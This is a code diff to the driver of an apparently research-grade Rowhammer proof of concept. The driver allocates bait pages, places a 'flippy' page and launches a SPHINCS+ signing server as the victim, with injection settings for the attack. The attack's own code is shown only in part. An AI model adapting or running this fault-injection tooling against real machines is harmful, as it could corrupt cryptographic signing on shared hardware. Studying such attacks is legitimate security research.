@@ -5,12 +5,12 @@ use bs_poc::{
     allocator::{util::mmap, ConsecAllocator, Pfn, Spoiler},
     hammerer::blacksmith::blacksmith_config::BlacksmithConfig,
     memory::{mem_configuration::MemConfiguration, BytePointer, ConsecBlocks, MemBlock},
-    util::{KB, MB},
-    victim::{sphincs_plus::SphincsPlus, HammerVictim, HammerVictimError},
+    util::{KB, MB, PAGE_SIZE},
+    victim::{sphincs_plus::SphincsPlus, HammerVictim, HammerVictimError, InjectionConfig},
 };
 use clap::{arg, Parser};
 use indicatif::MultiProgress;
-use log::{info, warn};
+use log::{error, info, warn};
 
 /// CLI arguments for the `hammer` binary.
 ///
@@ -59,9 +59,9 @@ fn main() -> anyhow::Result<()> {
     let bait_before_range = args.bait_before.map(|b| b..b + 1).unwrap_or(0..30);
     let bait_after_range = args.bait_after.map(|b| b..b + 1).unwrap_or(0..30);
     let progress = MultiProgress::new();
-    for bait_before in bait_before_range {
-        for bait_after in bait_after_range.clone() {
-            println!("bait_before,bait_after: {},{}", bait_before, bait_after);
+    for bait_after in bait_after_range {
+        for bait_before in bait_before_range.clone() {
+            println!("bait_after,bait_before: {},{}", bait_after, bait_before);
             for _ in 0..args.repeat.unwrap_or(Some(1)).unwrap_or(2_usize.pow(32)) {
                 // allocate bait page, get PFN
                 let x = match args.alloc_strategy {
@@ -85,9 +85,15 @@ fn main() -> anyhow::Result<()> {
                 let flippy_page = unsafe { x.ptr().byte_add(64 * KB) as *mut libc::c_void };
 
                 info!("Launching victim");
-                let mut victim = match SphincsPlus::new(
-                    "/home/jb/sphincsplus/ref/test/server".to_string(),
-                    vec![flippy_page as usize],
+                let mut victim = match SphincsPlus::new_with_config(
+                    "victims/sphincsplus/ref/test/server".to_string(),
+                    InjectionConfig {
+                        target_addr: flippy_page as usize,
+                        flippy_page_size: PAGE_SIZE,
+                        bait_count_after: bait_after,
+                        bait_count_before: bait_before,
+                        stack_offset: usize::MAX,
+                    },
                 ) {
                     Ok(v) => v,
                     Err(e) => {
@@ -96,15 +102,22 @@ fn main() -> anyhow::Result<()> {
                         continue;
                     }
                 };
-                victim.start()?;
-                victim.init();
-                let output = match victim.check() {
-                    Ok(output) => output,
-                    Err(HammerVictimError::NoFlips) => todo!("No flips detected"),
-                    Err(HammerVictimError::IoError(e)) => todo!("IO error: {:?}", e),
-                    Err(HammerVictimError::NotRunning) => todo!("Victim not running"),
-                    Err(HammerVictimError::FlippyPageNotFound) => todo!("Flippy page not found"),
-                };
+                let success = victim.start();
+                match success {
+                    Err(HammerVictimError::FlippyPageNotFound) => {
+                        println!("None");
+                    }
+                    Err(HammerVictimError::FlippyPageOffsetMismatch { actual, .. }) => {
+                        println!("{:?}", actual);
+                    }
+                    Err(e) => {
+                        error!("Error starting victim: {:?}", e);
+                        println!("{:?}", e);
+                    }
+                    Ok(_) => {
+                        println!("{}", usize::MAX);
+                    }
+                }
                 //if output.contains(&format!("{:x}", target_pfn)) {
                 //    bail!("YES MAN: {},{}", bait_before, bait_after);
                 //}
@@ -115,7 +128,6 @@ fn main() -> anyhow::Result<()> {
                     warn!("Flippy page not reused");
                 }
                 println!("{:?}", flippy_page);*/
-                info!("Hammering result:\n{:?}", output);
                 victim.stop();
                 x.dealloc();
             }
